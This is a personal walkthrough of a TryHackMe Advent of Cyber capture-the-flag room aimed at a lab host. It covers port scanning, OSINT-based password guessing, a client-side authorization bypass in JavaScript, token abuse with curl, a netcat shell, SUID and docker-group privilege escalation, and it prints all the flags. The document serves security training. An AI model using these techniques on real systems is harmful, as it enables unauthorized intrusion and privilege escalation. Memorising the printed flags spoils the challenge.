📚 [TryHackMe AoC 2025 - Side Quest](https://tryhackme.com/adventofcyber25/sidequest)  
📚 [The Great Disappearing Act](https://tryhackme.com/room/sq1-aoc2025-FzPnrt2SAu)

note: from Discord I understood that this is actually the FIRST side-quest.


## Initial Access

> This challenge is unlocked by finding the Side Quest key in Advent of Cyber Day 1
> ...
> Unlock the machine by visiting http://<target-ip>:21337 and entering your key. Happy Side Questing!

http://10.66.174.93:21337

The website shows a form asking for a key:

> Unlock Hopper's Memories
> The key to unlock this memory can be found on Advent of Cyber - Day 1!

Entering `now_you_see_me` (found in [thm-aoc2025-side-quest-01a.md](https://github.com/TurboLabIt/cybersec/blob/main/notes/thm-aoc2025-side-quest-01a.md)) does it:

> The key is correct!
> Unlocking Hopper's memories...

Nothing else. The response is 200, but it sets no cookies. The only unusual thing is this header:

> Server: Werkzeug/3.0.1 Python/3.12.3

[Werkzeug is a comprehensive WSGI web application library](https://werkzeug.palletsprojects.com/en/stable/).


Ah! I later found out that **all the ports on the target machine are stealth unit you do this**!


## recon

Let's nmap the target machine:

````shell
$ zznmap 10.66.174.93

...
Scanning 10.66.174.93 [65535 ports]

Discovered open port 22/tcp
Discovered open port 8080/tcp
Discovered open port 80/tcp
Discovered open port 13403/tcp
Discovered open port 8000/tcp
Discovered open port 13400/tcp
Discovered open port 21337/tcp
Discovered open port 9001/tcp
Discovered open port 13401/tcp
Discovered open port 13404/tcp
Discovered open port 13402/tcp

Completed SYN Stealth Scan at 10:39, 337.46s elapsed (65535 total ports)

PORT      STATE SERVICE            VERSION
22/tcp    open  ssh                OpenSSH 9.6p1 Ubuntu 3ubuntu13.11 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 18:0e:d1:13:80:8e:d7:df:ed:61:73:fb:3b:90:55:0a (ECDSA)
|_  256 94:dc:08:b6:76:e8:e7:45:fa:9a:02:2f:e3:8e:27:30 (ED25519)

80/tcp    open  http               nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: HopSec Asylum - Security Console
| http-methods: 
|_  Supported Methods: GET HEAD

8000/tcp  open  http-alt
| http-methods: 
|_  Supported Methods: GET HEAD OPTIONS
| http-title: Fakebook - Sign In
|_Requested resource was /accounts/login/?next=/posts/
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Content-Type: text/html
|     X-Frame-Options: DENY
|     Content-Length: 179
|     Vary: Accept-Language
|     Content-Language: en
|     X-Content-Type-Options: nosniff
|     <!doctype html>
|     <html lang="en">
|     <head>
|     <title>Not Found</title>
|     </head>
|     <body>
|     <h1>Not Found</h1><p>The requested resource was not found on this server.</p>
|     </body>
|     </html>
|   GenericLines, Help, RTSPRequest, SIPOptions, Socks5, TerminalServerCookie: 
|     HTTP/1.1 400 Bad Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /posts/
|     X-Frame-Options: DENY
|     Content-Length: 0
|     Vary: Accept-Language
|     Content-Language: en
|_    X-Content-Type-Options: nosniff

8080/tcp  open  http               SimpleHTTPServer 0.6 (Python 3.12.3)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-server-header: SimpleHTTP/0.6 Python/3.12.3
|_http-title: HopSec Asylum - Security Console

9001/tcp  open  tor-orport?
| fingerprint-strings: 
|   NULL: 
|     ASYLUM GATE CONTROL SYSTEM - SCADA TERMINAL v2.1 
|     [AUTHORIZED PERSONNEL ONLY] 
|     WARNING: This system controls critical infrastructure
|     access attempts are logged and monitored
|     Unauthorized access will result in immediate termination
|     Authentication required to access SCADA terminal
|     Provide authorization token from Part 1 to proceed
|_    [AUTH] Enter authorization token:

13400/tcp open  hadoop-tasktracker Apache Hadoop 1.24.0 (Ubuntu)
| hadoop-tasktracker-info: 
|_  Logs: loginBtn
|_http-favicon: Unknown favicon MD5: 93B885ADFE0DA089CDF634904FD59F71
| hadoop-datanode-info: 
|_  Logs: loginBtn
|_http-title: HopSec Asylum \xE2\x80\x93 Facility Video Portal
| http-methods: 
|_  Supported Methods: GET HEAD

13401/tcp open  http               Werkzeug httpd 3.1.3 (Python 3.12.3)
|_http-server-header: Werkzeug/3.1.3 Python/3.12.3
|_http-title: 404 Not Found

13402/tcp open  http               nginx 1.24.0 (Ubuntu)
|_http-cors: HEAD GET OPTIONS
|_http-server-header: nginx/1.24.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Welcome to nginx!

13403/tcp open  unknown
| fingerprint-strings: 
|   DNSStatusRequestTCP, DNSVersionBindReqTCP, Help, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, RPCCheck, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, X11Probe: 
|     HTTP/1.1 400 Bad Request
|     Connection: close
|   FourOhFourRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 28 Dec 2025 15:39:38 GMT
|     Connection: close
|   GetRequest, HTTPOptions: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 28 Dec 2025 15:39:35 GMT
|     Connection: close
|   RTSPRequest: 
|     HTTP/1.1 404 Not Found
|     Date: Sun, 28 Dec 2025 15:39:36 GMT
|_    Connection: close

13404/tcp open  unknown
| fingerprint-strings: 
|   FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, Kerberos, LDAPSearchReq, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, TLSSessionReq, TerminalServerCookie: 
|_    unauthorized

21337/tcp open  http               Werkzeug httpd 3.0.1 (Python 3.12.3)
| http-methods: 
|_  Supported Methods: GET OPTIONS HEAD
|_http-server-header: Werkzeug/3.0.1 Python/3.12.3
|_http-title: Unlock Hopper's Memories

Running: Linux 4.X
OS CPE: cpe:/o:linux:linux_kernel:4.15
OS details: Linux 4.15
Uptime guess: 24.292 days (since Thu Dec  4 03:41:36 2025)
Network Distance: 3 hops
TCP Sequence Prediction: Difficulty=260 (Good luck!)
IP ID Sequence Generation: All zeros
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```` 

There is a lot of stuff here!

- **22**: OpenSSH 9.6p1
- **80**: nginx 1.24.0 - http://10.66.174.93 `HOPSEC ASYLUM - ACCESS TERMINAL`
- **8000**: http://10.66.174.93:8000 `Fakebook - Sign In`
- **8080**: SimpleHTTPServer 0.6 (Python 3.12.3) - http://10.66.174.93:8080 `HOPSEC ASYLUM - ACCESS TERMINAL`
- **9001**: ASYLUM GATE CONTROL SYSTEM - SCADA TERMINAL v2.1
- **13400**: Apache Hadoop 1.24.0 - http://10.66.174.93:13400 `HopSec Asylum – Facility Video Portal`
- **13401**: Werkzeug httpd 3.1.3 (Python 3.12.3) - http://10.66.174.93:13401 404
- **13402**: nginx 1.24.0 - http://10.66.174.93:13402 Welcome to nginx!
- **13403**: http://10.66.174.93:13403 404
- **13404**: http://10.66.174.93:13404 unauthorized
- (this was used to start the room) 21337: Werkzeug httpd 3.0.1 (Python 3.12.3) http://10.66.174.93:21337 `Unlock Hopper's Memories`


## social network

Let's OSINT on the social network at http://10.66.174.93:8000 .

It requires an account --> register.

Hopkins reveals his email address: `guard.hopkins@hopsecasylum.com`.

He has a dog: `Johnnyboy`

Hopkins was tricked to reveal his password: `Pizza1234$`. He may have changed it afterward.

Hopkins revealed he was born in `1982`.

---

Sir Carrotbane states:

> Trying my hand at some bruteforcing challenges on thm, good to see they have /opt/hashcat-utils/src/combinator.bin on the AttackBox


## 1. Unlock Hopper’s Cell

The HTML of http://10.66.174.93 and http://10.66.174.93:8080 is the same. Let's start with :80.

On pageload there's a 404 on http://10.66.174.93/cgi-bin/session_check.sh . But it works on the copy at :8080! It looks like :80 is a decoy!

The page shows a login form with a hint:

> Hopkins, please stop forgetting your password

The form is:

````html
<form method="POST" action="/cgi-bin/login.sh">
  <input type="text" name="username" placeholder="Email" required="">
  <input type="password" name="password" placeholder="Password" required="">
  <button type="submit">Enter</button>
</form>
````

Credentials from OSINT didn't work (later: it's a small variation, see below).

There's also a CSS-hidden modal `#mapScreen` element. When shown, it displays the map of the facility: if you click the key, you get another modal with a `Unlock cell door` button. Clicking the button, calls `unlockCell()`, which calls `http://10.66.174.93/cgi-bin/key_flag.sh?door=hopper`, returning the first flag: `THM{h0pp1ing_m4d}`.


## HopSec Asylum – Facility Video Portal

http://10.66.174.93:13400

There are login input fields:

````html
<input id="u" type="text" placeholder="Email">
<input id="p" type="password" placeholder="Password">
````

Submit is handled by `main.js`:

````js
const API = window.location.protocol + '//' + window.location.hostname + ':13401';

const r = await fetch(API + '/v1/auth/login', {
    method:"POST", headers:{"Content-Type":"application/json"},
    body: JSON.stringify({ username: u, password: p })
});
const j = await r.json();
if (!r.ok) { if (msg) msg.textContent = 'Login failed'; return; }
````

OK, :13401 is the endpoint for the video station then.

All the requests go though `authedFetch()`, which sends a Bearer token, which is server-side validated. SQLi didn't work.

The trick is to login with credentials derived from OSINT:

- `guard.hopkins@hopsecasylum.com`
- `Johnnyboy1982!`

Login sets the Local Storage:

- `hopsec_role`: `guard`
- `hopsec_token`: `{"sub": "guard.hopkins@hopsecasylum.com", "role": "guard", "iat": 1767264343}.3029598699f67f0b5c944730e626355be98d1ecaa335d86121c7e73ce548570a`

`authedFetch` now works. It sends an header like this:

````
Authorization: 'Bearer {"sub": "guard.hopkins@hopsecasylum.com", "role": "guard", "iat": 1767266225}.d0df921f638a13b579620e2cbe26a3aa8b942ae837535baec9b31331367852aa'
````

The accessible streams look like a prank. But there's one that's `admin-restricted`.

All the streams are started by `handleCameraClick()`.

We can just rewrite it without the checks and execute it (also: we must add `?tier=admin`, and how the fuck is someone supposed to find that is a fucking mystery):

````js
setActiveCamera('cam-admin', 'cam-admin' || 'cam-admin');

if (blocked) blocked.style.display='none';

zzrequest = await authedFetch(API + '/v1/streams/request?tier=admin', {
    method:'POST',
    headers:{ 'Content-Type':'application/json' },
    body: JSON.stringify({ camera_id: 'cam-admin', tier: 'admin' })
});

zzjson = await zzrequest.json();
console.log(zzjson);

zzsrc = API + '/v1/streams/' + zzjson.ticket_id + '/manifest.m3u8';
attachWithReconnect(zzsrc);
````

When this is done, the stream switches to someone typing the code on the keypad: `115879`


## 2. Move Through the Lobby

There is nothing to do here (???).


## 3. Bypass the Psych Ward Keypad

Type the code `115879` (from above) into the keypad and you got a half-flag: `THM{Y0u_h4ve_b3en_`

> This is only the first part of your second flag. You will need to complete it elsewhere.


## HopSec Asylum – Facility Video Portal

The m3u8 file for the admin streaming (http://10.66.174.93:13401/v1/streams/e06cdef7-762e-4088-b2ce-46626418afa1/manifest.m3u8) looks like this:

````
#EXTM3U
#EXT-X-VERSION:3
#EXT-X-TARGETDURATION:8
#EXT-X-MEDIA-SEQUENCE:0
#EXT-X-START:TIME-OFFSET=0,PRECISE=YES
#EXT-X-SESSION-DATA:DATA-ID="hopsec.diagnostics",VALUE="/v1/ingest/diagnostics"
#EXT-X-DATERANGE:ID="hopsec-diag",CLASS="hopsec-diag",START-DATE="1970-01-01T00:00:00Z",X-RTSP-EXAMPLE="rtsp://vendor-cam.test/cam-admin"
#EXT-X-SESSION-DATA:DATA-ID="hopsec.jobs",VALUE="/v1/ingest/jobs"
#EXTINF:8.333333,
/v1/streams/e06cdef7-762e-4088-b2ce-46626418afa1/seg/playlist000.ts?r=0
#EXTINF:1.566667,
/v1/streams/e06cdef7-762e-4088-b2ce-46626418afa1/seg/playlist001.ts?r=0
#EXT-X-DISCONTINUITY
#EXTINF:8.333333,
/v1/streams/e06cdef7-762e-4088-b2ce-46626418afa1/seg/playlist000.ts?r=1
#EXTINF:1.566667,
/v1/streams/e06cdef7-762e-4088-b2ce-46626418afa1/seg/playlist001.ts?r=1
#EXT-X-DISCONTINUITY
...
````

There are multiple endpoints revealed here:

- http://10.66.174.93:13401/v1/ingest/diagnostics
- http://10.66.174.93:13401/v1/ingest/jobs
- rtsp://vendor-cam.test/cam-admin

A simple POST to the first one reveals we need auth (`{"error":"unauthorized"}`). Let's try with the one send from the JS hack above:

````shell
curl -i -X POST -H 'Authorization: Bearer {"sub": "guard.hopkins@hopsecasylum.com", "role": "guard", "iat": 1767269134}.dc4d7390b2e2134a4538758a071db29e37d18275b90b91b53618b8cdbd7020aa'  -H 'Content-Type: application/json' http://10.66.174.93:13401/v1/ingest/diagnostics
````

The response is: `{"error":"invalid rtsp_url"}`

Let's try with the rtsp:// example from above:

````shell
curl -i -X POST -H 'Authorization: Bearer {"sub": "guard.hopkins@hopsecasylum.com", "role": "guard", "iat": 1767269134}.dc4d7390b2e2134a4538758a071db29e37d18275b90b91b53618b8cdbd7020aa' -H 'Content-Type: application/json' -d '{"rtsp_url": "rtsp://vendor-cam.test/cam-admin"}' http://10.66.174.93:13401/v1/ingest/diagnostics
````

Success!

````json
{
   "job_id":"74092398-447e-41ad-a689-5d1c34ddfe7d",
   "job_status":"/v1/ingest/jobs/74092398-447e-41ad-a689-5d1c34ddfe7d"
}
````

So: let's try to call the second endpoint like that (method mus be GET): 

````shell
curl -i -H 'Authorization: Bearer {"sub": "guard.hopkins@hopsecasylum.com", "role": "guard", "iat": 1767269134}.dc4d7390b2e2134a4538758a071db29e37d18275b90b91b53618b8cdbd7020aa' -H 'Content-Type: application/json' http://10.66.174.93:13401/v1/ingest/jobs/74092398-447e-41ad-a689-5d1c34ddfe7d
````

Success!

````json
{
   "console_port":13404,
   "rtsp_url":"rtsp://vendor-cam.test/cam-admin",
   "status":"ready",
   "token":"553a2fbc16c94fd682ec2fe71230c88b"
}
````

:13404 was one of the service found above (the one always returning `unauthorized`). Let's try to hit it with the returned token:

````shell
curl -i -X POST -H 'Authorization: Bearer {"sub": "guard.hopkins@hopsecasylum.com", "role": "guard", "iat": 1767269134}.553a2fbc16c94fd682ec2fe71230c88b' -H 'Content-Type: application/json' -d '{"rtsp_url": "rtsp://vendor-cam.test/cam-admin"}'  http://10.66.174.93:13404/
````

It returns an HTTP protocol error: `curl: (1) Received HTTP/0.9 when not allowed`. The response is actually HTTP/0.9, but it could mean the service is something else:

````shell
nc 10.66.174.93 13404
553a2fbc16c94fd682ec2fe71230c88b
svc_vidops@tryhackme-2404:~$ pwd
/opt/hopsec-asylumn/hopsec-asylumn
````

Success! We have shell access. Cannot `sudo`.

We can go to `/home/` and get the second part of the flag:

````shell
cat /home/svc_vidops/user_part2.txt
````

The second-half of the flag is: `j3stered_739138}`


## escalation via SUID

SUID files:

````shell
find / -type f -perm -u=s 2>/dev/null
...
/usr/local/bin/diag_shell

$ ls -la /usr/local/bin/diag_shell
-rwsr-xr-x 1 dockermgr dockermgr 16056 Nov 27 16:31 /usr/local/bin/diag_shell

/usr/local/bin/diag_shell
dockermgr@tryhackme-2404:~$
````

## docker access

It cannot `sudo` either, but maybe can show running containers:

````shell
$ docker ps
permission denied while trying to connect to the Docker daemon socket at unix:///var/run/docker.sock: Get "http://%2Fvar%2Frun%2Fdocker.sock/v1.51/containers/json": dial unix /var/run/docker.sock: connect: permission denied

$ ls -la /var/run/docker.sock
srw-rw---- 1 root docker 0 Jan  1 12:02 /var/run/docker.sock
````

Let's check the current user:

````shell
$ id
uid=1501(dockermgr) gid=1500(svc_vidops) groups=1500(svc_vidops)

$ groups dockermgr
dockermgr : dockermgr docker
````

So: the current group is `svc_vidops`, but the `dockermgr` is part of the `docker` group. Let's switch to it:

````shell
$ newgrp docker
$ id
uid=1501(dockermgr) gid=998(docker) groups=998(docker),1500(svc_vidops)
````

Success!

````shell
$ docker ps

CONTAINER ID   IMAGE                       COMMAND                  CREATED       STATUS       PORTS                                         NAMES
1cbf40c715f4   side-quest-2-asylum-scada   "python3 /opt/scada/…"   4 weeks ago   Up 3 hours   0.0.0.0:9001->9001/tcp, [::]:9001->9001/tcp   asylum_gate_control
````

Let's connect to it:

````shell
$ docker exec -u root -it "asylum_gate_control" /bin/bash --login

root@1cbf40c715f4:/opt/scada#
````

Success!


## SCADA system

````shell
$ ls -la
-rwxr-x--x 1 scada_operator scada_operator   332 Nov 24 21:19 gate_controller.sh
-rwxr-x--x 1 scada_operator scada_operator 11227 Nov 24 21:19 scada_terminal.py
````

Here we have the source code from the SCADA system. We see that:

- the SCADA login code is `THM{Y0u_h4ve_b3en_j3stered_739138}`
- the unlock code is in `/root/.asylum/unlock_code` (it's `739184627`)

The SCADA commands are:

- status: Display gate status and system info
- unlock <code>: Unlock the gate with numeric authorization code
- lock: Lock the gate
- info: Display system information
- clear: Clear terminal screen
- exit: Disconnect from SCADA terminal

Running `unlock 739184627` does it:

> Congratulations! You have successfully escaped the asylum!


## 5. Escape the Facility

Click on the door of the "Main corridor" and enter the SCADA unlock code to get the last flag: `THM{p0p_go3s_THe_W3as3l}`
